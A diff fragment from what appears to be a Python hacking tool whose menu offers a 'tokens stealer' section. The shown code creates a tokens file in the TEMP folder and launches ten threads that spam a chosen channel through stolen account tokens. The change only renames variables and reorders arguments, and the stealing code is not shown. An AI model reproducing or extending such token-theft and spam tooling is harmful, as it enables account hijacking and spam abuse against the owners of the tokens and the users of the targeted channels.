@@ -76,10 +76,10 @@ if int(choice) == 3:
 if int(choice) == 4:
     tokens_stealer_choice = input("1 - tokens spamming tool\n2 - create tokens file\n3 - add a token\n\nchoice ~~> ")
     if int(tokens_stealer_choice) == 1:
-        id = input("channel id : ")
-        msg = input("msg : ")
+        chan = input("channel id : ")
+        msg = input("your msg : ")
         for i in range(10):
-            thread = threading.Thread(target=spammer.token_uploader, args=(id, msg))
+            thread = threading.Thread(target=spammer.token_uploader, args=(msg, chan))
             thread.start()
     elif int(tokens_stealer_choice) == 2:
         if os.path.exists(os.path.join(os.getenv("TEMP")+"\\tokens.txt")):
